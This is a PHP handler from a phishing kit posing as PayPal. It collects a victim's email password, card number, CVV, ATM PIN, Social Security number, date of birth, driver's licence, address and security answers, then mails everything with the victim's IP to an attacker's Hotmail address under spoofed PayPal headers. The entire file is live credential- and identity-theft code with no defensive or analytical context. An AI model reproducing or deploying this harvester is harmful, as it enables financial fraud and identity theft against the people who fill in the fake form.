<?php

$ip = getenv("REMOTE_ADDR");
$message .= "------------------ReZulT SpAm--------------------------\n";
$message .= "Email Address                 : ".$_SESSION['emaill']."\n";
$message .= "Password                      : ".$_SESSION['passwordd']."\n";
$message .= "\n";
$message .= "-------------------------------------------------------\n";
$message .= "\n";
$message .= "Full Name                     : ".$_POST['fullname']."\n";
$message .= "Card Type                     : ".$_POST['card_type']."\n";
$message .= "Card Number                   : ".$_POST['defaultcardnumber']."\n";
$message .= "Expiration Date               : ".$_POST['defaultexpmonth']."/";
$message .= "".$_POST['defaultexpyear']."\n";
$message .= "Card Verification Number      : ".$_POST['defaultcvv2']."\n";
$message .= "ATM PIN                       : ".$_POST['PIN']."\n";
$message .= "Address 1                     : ".$_POST['defaultaddress1']."\n";
$message .= "Address 2                     : ".$_POST['defaultaddress2']."\n";
$message .= "City                          : ".$_POST['defaultcity']."\n";
$message .= "State                         : ".$_POST['defaultstate']."\n";
$message .= "ZIP Code                      : ".$_POST['defaultzip']."\n";
$message .= "Country                       : ".$_POST['defaultcountry']."\n";
$message .= "Telephone                     : ".$_POST['userphone']."\n";
$message .= "Social Security Number        : ".$_POST['ssn']."\n";
$message .= "Date Of Birth                 : ".$_POST['bday']."/";
$message .= "".$_POST['bmonth']."/";
$message .= "".$_POST['byear']."\n";
$message .= "Driver's License              : ".$_POST['drl']."\n";
$message .= "\n";
$message .= "-------------------------------------------------------\n";
$message .= "\n";
$message .= "Security Question 1           : ".$_POST['question1']."\n";
$message .= "Answer 1                      : ".$_POST['answer1']."\n";
$message .= "Security Question 2           : ".$_POST['question2']."\n";
$message .= "Answer 2                      : ".$_POST['answer2']."\n";
$message .= "IP                            : ".$ip."\n";
$message .= "\n\n";
$message .= "------------- Black-=========-widower --------------------\n";

$to = "hacker_admi@hotmail.fr";

$subject = "PaYPaL USA Bank ReZuLt Spam";
$headers = "From: AdAmMeD<NewStuff@PaYPaL.com>";
$headers = "MIME-Version: 1.0\n";
$from = "PaYPaL USA Bank";
mail($to,$subject,$message,$headers,$from);
?>